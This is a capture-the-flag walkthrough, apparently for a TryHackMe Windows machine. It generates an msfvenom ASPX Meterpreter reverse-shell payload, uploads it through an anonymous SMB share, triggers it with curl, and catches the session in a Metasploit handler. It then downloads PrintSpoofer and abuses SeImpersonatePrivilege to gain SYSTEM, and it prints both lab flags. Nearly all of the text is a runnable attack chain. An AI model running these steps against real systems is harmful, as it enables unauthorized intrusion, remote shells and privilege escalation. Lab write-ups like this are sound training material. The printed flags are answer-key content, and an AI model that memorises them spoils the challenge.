First we will set the LHOST and the Servers ip on a bash.

'''bash
export LHOST=10.114.92.7
export IP=10.114.163.226
'''
Then we will generate an aspx meterpreter via the SMB share.

'''bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=4444 -f aspx -o shell.aspx
'''

Right afterwards we will put/upload the file to the server.

'''bash
smbclient //$IP/nt4wrksv -N -c 'put shell.aspx'
'''
Start the handler in msfconsole

'''bash
msfconsole -q
'''

'''bash
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 10.114.92.7
set LPORT 4444
set ExitOnSession false
run -j
'''

Now run on a new terminal this:
'''bash
curl http://10.114.163.226:49663/nt4wrksv/shell.aspx
'''

then check the metasploit you have a reverse shell open.

run the following command:

'''bash
sessions -i
'''

And then run a shell in the server:

'''bash
shell
'''

Now just find the ctf which is located in: C:\Users\Bob\Desktop\user.txt

type C:\Users\Bob\Desktop\user.txt

THM{fdk4ka34vk346ksxfr21tg789ktf45}

The following would be to check privilages:

'''ssh
whoami /priv
'''

'''

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled # We will be using this one.
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

'''

exit the shell.

'''bash
exit
'''

Use this two commands:

'''bash
getsystem
getuid
'''
getsystem prints the following:

'''bash
got system via technique 5 (Named Pipe Impersonation (PrintSpooler variant)).
'''

so we will open the following in a new terminal:

'''bash
# in a normal terminal on your attacker machine
wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
'''

This will be used to upload it to the server.


now in the mfconsole run the following:

'''bash
meterpreter > cd C:\\inetpub\\wwwroot\\nt4wrksv
meterpreter > upload PrintSpoofer64.exe
meterpreter > shell
C:\> cd C:\inetpub\wwwroot\nt4wrksv
C:\> PrintSpoofer64.exe -i -c cmd
'''

and now just find the flag :)


'''bash
C:\inetpub\wwwroot\nt4wrksv>PrintSpoofer64.exe -i -c cmd
PrintSpoofer64.exe -i -c cmd
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt

Here you will find the flag THM{1fk5kf469devly1gl320zafgl345pv}
'''

type C:\Users\Administrator\Desktop\root.txt